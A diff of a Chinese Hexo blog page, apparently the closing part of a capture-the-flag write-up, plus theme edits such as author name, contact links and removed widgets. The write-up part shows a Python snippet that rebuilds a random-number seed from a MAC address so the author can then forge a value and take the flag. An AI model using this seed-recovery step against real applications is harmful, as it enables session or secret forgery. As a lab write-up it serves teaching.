+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>看代码读一下随机数的种子</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;0e:48:30:60:37:27&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)<span class="comment">#69.83331307187989</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid
+<span class="token keyword">import</span> random
+
+mac <span class="token operator">=</span> <span class="token string">"0e:48:30:60:37:27"</span>
+temp <span class="token operator">=</span> mac<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
+temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>
+temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> temp<span class="token punctuation">]</span>
+temp <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>
+mac <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
+random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>mac<span class="token punctuation">)</span>
+randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span class="token comment">#69.83331307187989</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>剩下就是伪造拿flag</p>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
@@ -503,7 +703,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -526,7 +726,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -569,39 +769,6 @@
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -653,7 +820,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -690,7 +857,7 @@
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -709,6 +876,9 @@
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -817,69 +987,15 @@
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -914,7 +1030,7 @@
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -922,10 +1038,8 @@
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -934,9 +1048,7 @@
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1096,6 +1208,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1122,8 +1242,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
